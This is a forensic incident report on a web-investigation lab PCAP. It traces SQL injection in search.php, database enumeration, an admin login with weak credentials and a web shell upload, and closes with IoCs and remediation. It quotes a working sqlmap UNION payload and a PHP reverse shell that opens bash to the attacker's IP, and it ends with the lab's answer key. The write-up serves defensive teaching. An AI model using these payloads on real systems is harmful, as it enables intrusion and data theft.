# Incident Report: Web Investigation Lab – SQL Injection, Admin Takeover & Web Shell Upload (PCAP Analysis)

| Metadata | Details |
| ----- | ----- |
| **Date** | November 2026 |
| **Analyst** | Piotr Asyngier |
| **Tools Used** | Wireshark, CyberChef, online IP Geolocation service |
| **Category** | Network Forensics, Web Attack Analysis & Incident Response |
| **Evidence** | `WebInvestigation.pcap` (88,862 packets, capture date `2024-03-15`) |
| **Victim** | `bookworldstore.com` – Apache/2.4.52 (Ubuntu), IP `73.124.22.98` |
| **Attacker IP** | `111.224.250.131` (Shijiazhuang, Hebei, China) |

## 1. Executive Summary

A packet capture from the web server hosting the **BookWorldStore** website (`bookworldstore.com`) was analyzed to reconstruct a web application attack. The investigation, performed with **Wireshark** and **CyberChef**, confirmed a complete attack chain – from reconnaissance and SQL injection, through database enumeration and admin panel compromise, to the upload of a PHP reverse shell:

1. **Source of the attack:** Practically the entire capture (`88,484` of `88,862` packets) is a single conversation between the attacker **`111.224.250.131`** and the web server **`73.124.22.98`**. The IP geolocates to **Shijiazhuang (Hebei, China)**, ISP *ChinaNet Hebei Province Network*.

2. **Initial Exploitation (SQL Injection):** The vulnerable script is **`/search.php`** (GET parameter `search`). After a short manual testing phase using Firefox, the attacker switched to the automated tool **`sqlmap/1.8.3`** and performed UNION-based injection to enumerate databases (`INFORMATION_SCHEMA.SCHEMATA`) and tables of the `books` schema (`admin`, `books`, **`customers`**).

3. **Admin Panel Compromise:** The attacker reached the hidden **`/admin/`** directory and successfully logged in with the weak credentials **`admin:admin123!`** (URL-encoded as `admin123%21`).

4. **Persistence / Remote Code Execution:** Once authenticated, the attacker abused an unrestricted file-upload function in `/admin/index.php` and uploaded **`NVri2vhp.php`** – a PHP reverse shell (`bash -i >& /dev/tcp/111.224.250.131/443 0>&1`) connecting back to the attacker's own IP on port `443`.

From the first probe to the shell upload, the attack lasted roughly **21 minutes 37 seconds** (`13:02:41` → `13:24:18`).

> **Note on timestamps:** Wireshark in this analysis displays local time (**UTC+1**). The HTTP `Date` headers returned by the server are in GMT, so they are exactly one hour earlier (e.g. `13:24:18` in Wireshark = `12:24:17 GMT` in the server response).

## 2. Technical Analysis

### 2.1. Attacker IP Identification (`111.224.250.131`)

**Question:** *Can you provide the attacker's IP?*

To find the most active hosts in the capture, I opened **Statistics → Conversations → IPv4** in Wireshark.

* **Findings:**

  * Only one IPv4 conversation exists in the capture: **`111.224.250.131` ↔ `73.124.22.98`**.

  * The conversation holds **`88,484`** packets out of **`88,862`** total (≈ 99.6 %), with the attacker side generating a large volume of HTTP requests towards port `80` (high request rate typical of automated scanning/exploitation).

  * `73.124.22.98` is the web server (`Host: bookworldstore.com`), therefore **`111.224.250.131`** is the attacker.

<img width="1853" height="1046" alt="obraz" src="https://github.com/user-attachments/assets/19f5cdd8-5a19-476b-814d-e66d4b4eb07d" />


### 2.2. Attacker Geolocation (`Shijiazhuang`)

**Question:** *Can you determine the origin city of the attacker?*

The attacker IP was checked in an online IP geolocation service.

* **Findings:**

  | Field | Value |
  | ----- | ----- |
  | Country | China |
  | Region | Hebei |
  | **City** | **Shijiazhuang** |
  | ISP | ChinaNet Hebei Province Network |
  | Domain | `chinatelecom.com.cn` |
  | Usage Type | Fixed Line ISP / Mobile ISP |
  | Coordinates | `38.041599, 114.478081` |

  * A residential/telecom ISP address in China with no business relationship to a bookstore web shop is a strong indicator of unsolicited, potentially targeted traffic. Keep in mind that geolocation alone is **not** attribution – the host could be a compromised machine or a proxy.

<img width="1853" height="962" alt="obraz" src="https://github.com/user-attachments/assets/661c1b9d-180c-4f84-8d66-1000f1ca73f1" />


### 2.3. Vulnerable Script Identification (`search.php`)

**Question:** *Can you provide the vulnerable PHP script name?*

Applying the display filter below lists all HTTP requests touching PHP scripts:

```
http contains ".php"
```

* **Findings:**

  * The very first request in the list (frame `335`, `13:02:41`) is `GET /search.php?search=book` – a normal search request used by the attacker as a baseline.

  * All following requests are variations of the same URI where the value of the **`search`** parameter is replaced with SQL syntax (`'`, `and 1=1`, `UNION ALL SELECT …`).

  * The first, manual requests carry the User-Agent `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`, i.e. a human using a browser on Linux.

  * Vulnerable script: **`search.php`** (GET parameter `search`, query string concatenated directly into an SQL statement).

<img width="1853" height="1046" alt="obraz" src="https://github.com/user-attachments/assets/3b5dd1c8-c1c9-496b-a5e7-f6636242fad9" />


### 2.4. First SQL Injection Attempt (`/search.php?search=book and 1=1; -- -`)

**Question:** *What is the complete request URI of the first SQLi attempt by the attacker?*

Going through the filtered list chronologically (same filter, `http contains ".php"`):

| Frame | Time | Request | Meaning |
| ----- | ----- | ----- | ----- |
| `335` | 13:02:41 | `/search.php?search=book` | Baseline request |
| `347` | 13:03:31 | `/search.php?search=book%27` | Single quote – syntax-break probe, no logic injected yet |
| **`357`** | **13:03:52** | **`/search.php?search=book%20and%201=1;%20--%20-`** | **First boolean-based SQLi (TRUE condition)** |
| `368` | 13:04:04 | `/search.php?search=book%20and%201=2;%20--%20-` | Same payload with FALSE condition – confirms injectability |
| `379`–`404` | 13:04:27 – 13:06:28 | `… or 1=1; -- -` variants | Manual WHERE-clause tampering |
| `416` → | 13:07:34 | Dozens of requests per second | Switch to automated tool (**sqlmap**) |

I selected frame `357` and copied the *Request URI* field from the HTTP layer. Because Wireshark shows it URL-encoded, I decoded it with the **URL Decode** recipe in CyberChef:

```
/search.php?search=book%20and%201=1;%20--%20-   →   /search.php?search=book and 1=1; -- -
```

* **Findings:**

  * Sending `and 1=1` (TRUE) followed by `and 1=2` (FALSE) is the classic **boolean-based blind SQLi** test: if the page output differs, the parameter is injectable.

  * The attacker confirmed the injection manually first and then, from `13:07:34`, handed off to automation (`User-Agent: sqlmap/1.8.3#stable (https://sqlmap.org)`).

<img width="1853" height="1046" alt="obraz" src="https://github.com/user-attachments/assets/512661cc-3929-4f17-8129-bd199482f4a6" />


<img width="1853" height="961" alt="obraz" src="https://github.com/user-attachments/assets/434a3306-ddae-4d82-afd4-b850675cdc4c" />


### 2.5. Database Enumeration (`INFORMATION_SCHEMA.SCHEMATA`)

**Question:** *Can you provide the complete request URI that was used to read the web server's available databases?*

In MySQL/MariaDB the list of all databases is stored in `INFORMATION_SCHEMA.SCHEMATA`. I filtered for requests that reference it:

```
http contains ".php" and http contains "INFORMATION_SCHEMA" and frame contains "search.php"
```

* **Findings:**

  * The filter returns five requests (frames `1520`, `1548`, `1576`, `1612`, `1648`; `13:08:39` – `13:09:57`). The earliest one, frame **`1520`**, targets `SCHEMATA` – i.e. it reads the available databases. The following ones enumerate deeper structures.

  * Decoded with CyberChef (URL Decode):

    ```
    /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -
    ```

  * Payload breakdown:

    | Element | Purpose |
    | ----- | ----- |
    | `book'` | Closes the original string literal in the SQL query |
    | `UNION ALL SELECT NULL, …` | Appends attacker-controlled rows; **two columns** are returned by the original query (`NULL` + the data column) |
    | `JSON_ARRAYAGG(CONCAT_WS(…,schema_name))` | Aggregates all database names into a single JSON array, so everything fits into one response |
    | `0x7178766271` / `0x7176706a71` | Hex for `qxvbq` / `qvpjq` – random delimiters used by sqlmap to find the injected data in the HTML response |
    | `0x7a76676a636b` | Hex for `zvgjck` – separator |
    | `FROM INFORMATION_SCHEMA.SCHEMATA` | System table listing all databases |
    | `-- -` | Comments out the rest of the original query |

<img width="1853" height="1049" alt="obraz" src="https://github.com/user-attachments/assets/5261421a-8aee-4413-8b98-390b1550bbc7" />


<img width="1853" height="959" alt="obraz" src="https://github.com/user-attachments/assets/fa3799dd-7789-4999-ba4f-9ba00500477a" />


### 2.6. Sensitive Table Identification (`customers`)

**Question:** *What's the table name containing the website users data?*

After the databases were listed, the attacker enumerated the tables of the application database. To find the server's answer, I filtered server responses after the first `INFORMATION_SCHEMA` request and used **Follow → HTTP Stream**:

```
ip.src == 73.124.22.98 and http.response.code == 200 and frame.number >= 1548
```

* **Findings (`tcp.stream eq 154`):**

  * Request (sqlmap): `… UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,table_name)),0x7176706a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x626f6f6b73)-- -` – where `0x626f6f6b73` = **`books`** (the application database).

  * Response (`HTTP/1.1 200 OK`, gzip, decompressed by Wireshark) contains the data wrapped in the sqlmap delimiters:

    ```
    qxvbq["admin", "books", "customers"]qvpjq
    ```

  * The `books` database consists of three tables: `admin`, `books` and **`customers`**. The table holding website user data is **`customers`**.

  * **Impact:** the attacker learned the schema of the database containing customer data and the administrators table. Further `INFORMATION_SCHEMA` queries (`13:09:32` – `13:09:57`) suggest continued enumeration (e.g. columns); whether the contents of `customers` were actually dumped should be verified by reviewing the responses that follow, and has to be treated as a **potential personal-data breach** until proven otherwise.

<img width="1853" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/7476ccb1-b338-4cb5-af67-fd11f9d043d3" />


<img width="1853" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/c9fa01f9-eaff-4f49-9825-a923a28e5d07" />


### 2.7. Hidden Directory Discovery (`/admin/`)

**Question:** *Can you provide the name of the directory discovered by the attacker?*

After the SQL injection phase, the type of traffic changes. Filtering for POST requests:

```
http.request.method == "POST"
```

* **Findings:**

  * Five POST requests exist in the whole capture, all aimed at the **`/admin/`** directory:

    | Frame | Time | Request |
    | ----- | ----- | ----- |
    | `88064` | 13:13:04 | `POST /admin/login.php` |
    | `88677` | 13:13:51 | `POST /admin/login.php` |
    | `88681` | 13:13:55 | `POST /admin/login.php` |
    | `88699` | 13:17:35 | `POST /admin/login.php` |
    | `88757` | 13:24:18 | `POST /admin/index.php` |

  * The `Referer` header of the successful login is `http://bookworldstore.com/admin/login.php`, so the attacker had located the administration login page before the first login attempt. The hidden directory is **`/admin/`**.

  * *Analyst note:* the lab screenshots confirm the use of `/admin/`, but not the request that revealed it. In a real investigation I would additionally review the GET requests between `13:09:57` and `13:13:04` (status codes `200`/`301`/`403`/`404`) to determine whether the path was found through directory brute-forcing or through data obtained from the database.

<img width="1853" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/87f969ae-c698-428c-9abd-8714e5f63616" />


### 2.8. Compromised Credentials (`admin:admin123!`)

**Question:** *What are the credentials used by the attacker for logging in?*

Four login attempts were made to `/admin/login.php` (`13:13:04` – `13:17:35`). I inspected the last one (frame `88699`) with **Follow → HTTP Stream** (`tcp.stream eq 647`).

* **Findings:**

  * Request body (`application/x-www-form-urlencoded`):

    ```
    username=admin&password=admin123%21
    ```

  * `%21` is the URL-encoded form of `!`, so the credentials are **`admin:admin123!`**.

  * The server answered **`HTTP/1.1 302 Found`** with `location: index.php`, and the following `GET /admin/index.php` returned **`200 OK`** (*"Welcome to the Admin Dashboard"*) – the login was **successful**. The three earlier attempts (`88064`, `88677`, `88681`) are consistent with password guessing before the correct one was found.

  * The password is weak and predictable, and the account has no brute-force protection or MFA.

<img width="1853" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/f3444bff-19fd-4255-91cf-486ea670e7c8" />


<img width="1853" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/c733e753-6991-4046-8ed9-e86f10e878fd" />


### 2.9. Malicious Script Upload (`NVri2vhp.php`)

**Question:** *What's the name of the malicious script uploaded by the attacker?*

The last POST in the capture (frame `88757`, `13:24:18`) differs from the previous ones: it is a **`multipart/form-data`** request to `/admin/index.php`, i.e. a file upload. I followed the stream (`tcp.stream eq 650`).

* **Findings:**

  * Uploaded file: **`NVri2vhp.php`** (form field `fileToUpload`, `Content-Type: application/x-php`).

  * File content – a PHP **reverse shell**:

    ```php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>
    ```

    When the file is requested through the browser, the web server spawns an interactive `bash` and connects it back to the attacker's IP on port `443`, giving the attacker command execution as the web server user.

  * Server response: `The file NVri2vhp.php has been uploaded.` – the upload function accepted a `.php` file with no extension, MIME-type or content validation.

  * The capture contains no evidence of the shell being triggered after the upload, but the host must be treated as **fully compromised**.

<img width="1853" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/261ec4a6-b318-46e2-b58b-10253804c595" />

<img width="1853" height="1047" alt="obraz" src="https://github.com/user-attachments/assets/c81bf5b0-d1d5-4de2-ac0d-6edae255e7cf" />


## 3. Attack Timeline

| Time (UTC+1) | Frame | Phase | Activity |
| ----- | ----- | ----- | ----- |
| `13:02:41` | `335` | Reconnaissance | First request `GET /search.php?search=book` (Firefox 115, Linux) |
| `13:03:31` | `347` | Probing | Single quote injected into the `search` parameter |
| `13:03:52` | `357` | **Initial Exploitation** | First SQLi – `book and 1=1; -- -` |
| `13:04:04` | `368` | Exploitation | `and 1=2` – boolean-based confirmation |
| `13:04:27 – 13:06:28` | `379 – 404` | Exploitation | Manual `or 1=1` injection variants |
| `13:07:34` | `416 →` | Automation | **sqlmap 1.8.3** starts firing dozens of payloads per second |
| `13:08:39` | `1520` | **Discovery** | UNION-based read of `INFORMATION_SCHEMA.SCHEMATA` (databases) |
| `13:08:57` | `1548 / 1553` | Discovery | Table list of the `books` schema: `admin`, `books`, `customers` |
| `13:09:32 – 13:09:57` | `1576 – 1648` | Discovery | Further `INFORMATION_SCHEMA` queries |
| `13:13:04 – 13:17:35` | `88064 – 88699` | **Initial Access** | Four logins to `/admin/login.php`; last one (`admin:admin123!`) succeeds with `302 → index.php` |
| `13:24:18` | `88757` | **Execution / Persistence** | Upload of reverse shell `NVri2vhp.php` via `/admin/index.php` |

## 4. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context |
| ----- | ----- | ----- |
| **Attacker IP** | `111.224.250[.]131` | Source of all malicious requests; Shijiazhuang, CN; also the reverse-shell listener (port `443`) |
| **Victim IP / Host** | `73.124.22[.]98` / `bookworldstore[.]com` | Targeted Apache/2.4.52 (Ubuntu) web server |
| **Vulnerable endpoint** | `/search.php?search=` | SQL injection point |
| **Tool User-Agent** | `sqlmap/1.8.3#stable (https://sqlmap[.]org)` | Automated SQL injection tool |
| **sqlmap markers** | `qxvbq`, `zvgjck`, `qvpjq` | Delimiters in injected `CONCAT()` statements and server responses |
| **Compromised account** | `admin` / `admin123!` | Weak administrator credentials, used at `/admin/login.php` |
| **Malicious file** | `NVri2vhp.php` | Reverse-shell uploaded through `/admin/index.php` |
| **Reverse shell payload** | `bash -i >& /dev/tcp/111.224.250[.]131/443 0>&1` | Outbound connection from the web server to the attacker |
| **Exposed data** | Database `books` – tables `admin`, `books`, `customers` | Schema enumerated via `INFORMATION_SCHEMA` |

## 5. Summary of Lab Questions & Answers

| Question | Answer |
| ----- | ----- |
| **Q1:** What is the attacker's IP? | `111.224.250.131` |
| **Q2:** What is the origin city of the attacker? | `Shijiazhuang` |
| **Q3:** What is the vulnerable PHP script name? | `search.php` |
| **Q4:** What is the complete request URI of the first SQLi attempt? | `/search.php?search=book and 1=1; -- -` |
| **Q5:** What is the complete request URI used to read the server's available databases? | `/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -` |
| **Q6:** What is the table name containing the website users data? | `customers` |
| **Q7:** What is the name of the directory discovered by the attacker? | `/admin/` |
| **Q8:** What are the credentials used by the attacker for logging in? | `admin:admin123!` |
| **Q9:** What is the name of the malicious script uploaded by the attacker? | `NVri2vhp.php` |

## 6. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques

* **`T1595.002` – Active Scanning: Vulnerability Scanning:** Automated probing of the `search` parameter with `sqlmap`.

* **`T1190` – Exploit Public-Facing Application:** SQL injection in `search.php` (boolean-based and UNION-based) used to enumerate the database.

* **`T1110.001` – Brute Force: Password Guessing:** Several consecutive login attempts against `/admin/login.php` (inferred from the sequence of POST requests).

* **`T1078` – Valid Accounts:** Authentication to the admin panel with the weak `admin` account.

* **`T1505.003` – Server Software Component: Web Shell:** Upload of `NVri2vhp.php` to the web server.

* **`T1059.004` – Command and Scripting Interpreter: Unix Shell:** The uploaded script executes `bash -i` and redirects it to `/dev/tcp/111.224.250.131/443`.

### Recommended Remediation Actions

1. **Contain & investigate the host:** Isolate `73.124.22.98`, locate and remove `NVri2vhp.php` (and any other file created after `13:24 UTC+1` on `2024-03-15`), and review web/auth/system logs for outbound connections to `111.224.250.131:443` and for commands executed as the web server user. Because remote code execution cannot be ruled out, rebuild the server from a clean image rather than only deleting the file.

2. **Block & hunt:** Block `111.224.250.131` at the perimeter, and search WAF/proxy/web logs for the `sqlmap` User-Agent and for requests to `/search.php` containing `UNION`, `INFORMATION_SCHEMA` or `0x71…` markers from other source IPs.

3. **Fix the SQL injection:** Replace string concatenation in `search.php` with **parameterized queries / prepared statements**, apply input validation, and use a database account with least privilege (no access to `INFORMATION_SCHEMA` beyond what is required, no access to the `admin` table from the public search function). Place a WAF with SQLi rules in front of the application.

4. **Harden the admin panel:** Rotate all administrator credentials, enforce a strong password policy and **MFA**, add rate limiting / account lockout for `/admin/login.php`, and restrict `/admin/` to trusted IP ranges or a VPN.

5. **Secure file uploads:** Allow-list file extensions and MIME types, verify file content, rename uploaded files, store them **outside the web root** and disable script execution (`php_admin_flag engine off`) in the upload directory.

6. **Egress filtering:** Deny outbound connections initiated by the web server to the Internet except for explicitly required destinations – this would have stopped the reverse shell.

7. **Data breach handling:** Treat the `customers` table as potentially exposed – assess what personal data it contains, notify affected users and authorities where legally required (e.g. GDPR), and force password resets for customer accounts if credentials are stored there.
